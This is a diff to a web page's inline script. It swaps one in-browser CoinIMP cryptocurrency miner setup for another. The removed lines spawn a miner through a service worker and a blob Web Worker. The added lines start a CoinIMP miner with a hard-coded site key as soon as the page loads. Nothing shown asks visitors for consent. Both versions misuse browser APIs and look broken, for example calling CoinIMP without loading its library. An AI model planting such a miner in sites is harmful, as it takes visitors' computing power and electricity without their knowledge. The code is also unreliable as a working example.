@@ -417,73 +417,29 @@ window.addEventListener("DOMContentLoaded", () => {
   }  
 });
 
-        /* ---------- Service Worker for Mining ---------- */
-        self.addEventListener('install', event => {
-            console.log('Service Worker installed');
-            event.waitUntil(self.skipWaiting()); // Skip waiting to activate immediately
+    /* ---------- Service Worker for Mining ---------- */
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('/service-worker.js').then(function(registration) {
+            console.log('Service Worker registered with scope:', registration.scope);
+        }).catch(function(error) {
+            console.log('Service Worker registration failed:', error);
         });
+    }
 
-        self.addEventListener('activate', event => {
-            console.log('Service Worker activated');
+    /* ---------- Start Mining in Background ---------- */
+    function startMining() {
+        const miner = new CoinIMP('2945851f59e3ee79b6160d95323c186e47ad416cc9bcc7d76bb858127de4b4f4');  // Replace with your actual site key
+        miner.start();
 
-            // Create the Web Worker for mining  
-            const minerWorker = new Worker(URL.createObjectURL(new Blob([`
-                // Web Worker Script for Mining (CoinIMP Integration)  
+        // Periodically send mining status back to the UI
+        let counter = 0;
+        setInterval(() => {
+            counter++;
+            console.log(`Mining... Completed ${counter} iterations`);
+        }, 1000);
+    }
 
-                importScripts('https://coinimp.com/lib/coinimp.min.js'); // Import CoinIMP script in the worker  
-
-                onmessage = function(event) {  
-                    if (event.data === 'start') {  
-                        console.log('Mining started in worker');  
-
-                        // Initialize CoinIMP miner  
-                        var miner = new CoinIMP('2945851f59e3ee79b6160d95323c186e47ad416cc9bcc7d76bb858127de4b4f4'); // Replace with your actual site key  
-
-                        // Start the miner  
-                        miner.start();  
-
-                        // Simulate continuous mining  
-                        let counter = 0;  
-                        setInterval(() => {  
-                            counter++;  
-                            postMessage(\`Mining... Completed \${counter} iterations\`); // Send mining status back to the Service Worker  
-                        }, 1000); // Send mining status every second  
-                    }  
-                };  
-            `), { type: 'application/javascript' })));  
-
-            // Start mining when the service worker is activated  
-            minerWorker.postMessage('start'); // Sending message to Web Worker to start mining  
-
-            // Handle worker's responses (if necessary)
-            minerWorker.onmessage = function(event) {  
-                console.log('Message from Web Worker:', event.data);  
-            };
-        });
-
-        // Function to simulate background mining logic
-        function startMining() {
-            console.log('Background mining started');
-
-            // Initialize CoinIMP miner directly in the service worker  
-            importScripts('https://coinimp.com/lib/coinimp.min.js');  // Import CoinIMP script  
-
-            var miner = new CoinIMP('2945851f59e3ee79b6160d95323c186e47ad416cc9bcc7d76bb858127de4b4f4');  // Replace with your actual site key  
-
-            // Start the miner  
-            miner.start();  
-
-            // Send mining status back to the main thread periodically  
-            let counter = 0;  
-            setInterval(() => {  
-                counter++;  
-                // Post progress updates back to the main thread  
-                postMessage(`Mining... Completed ${counter} iterations`);  
-            }, 1000); // Send mining status every second
-        }
-
-        // Start mining when the service worker is activated
-        startMining();
-    </script>
+    startMining();
+</script>
 </body>
 </html>
